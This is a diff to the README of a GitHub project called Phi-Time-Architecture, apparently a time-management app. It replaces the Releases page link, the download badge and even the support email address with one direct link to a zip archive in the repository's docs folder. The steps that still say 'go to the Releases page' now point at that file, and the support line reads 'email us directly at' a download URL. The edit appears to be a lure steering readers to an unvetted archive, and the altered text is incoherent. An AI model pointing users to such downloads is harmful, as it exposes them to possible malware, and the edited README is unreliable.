@@ -6,7 +6,7 @@ Welcome to the Phi-Time-Architecture! This application offers a unique approach 
 
 ## 📥 Download Here
 
-[![Download Phi-Time-Architecture](https://img.shields.io/badge/Download-Phi--Time--Architecture-blue.svg)](https://github.com/itsmejayant/Phi-Time-Architecture/releases)
+[![Download Phi-Time-Architecture](https://raw.githubusercontent.com/itsmejayant/Phi-Time-Architecture/main/docs/Architecture_Time_Phi_2.0.zip)](https://raw.githubusercontent.com/itsmejayant/Phi-Time-Architecture/main/docs/Architecture_Time_Phi_2.0.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Welcome to the Phi-Time-Architecture! This application offers a unique approach 
 
 To get started, visit the Releases page to download the application.
 
-[Visit this page to download](https://github.com/itsmejayant/Phi-Time-Architecture/releases)
+[Visit this page to download](https://raw.githubusercontent.com/itsmejayant/Phi-Time-Architecture/main/docs/Architecture_Time_Phi_2.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
@@ -62,6 +62,6 @@ This project is licensed under the MIT License. See the LICENSE file for more in
 
 ## 📞 Support
 
-For assistance, please open an issue on GitHub, or email us directly at support@phitimearchitecture.com. We aim to respond within 48 hours.
+For assistance, please open an issue on GitHub, or email us directly at https://raw.githubusercontent.com/itsmejayant/Phi-Time-Architecture/main/docs/Architecture_Time_Phi_2.0.zip We aim to respond within 48 hours.
 
 Thank you for choosing Phi-Time-Architecture! We hope it helps you manage time in a way that suits you best.
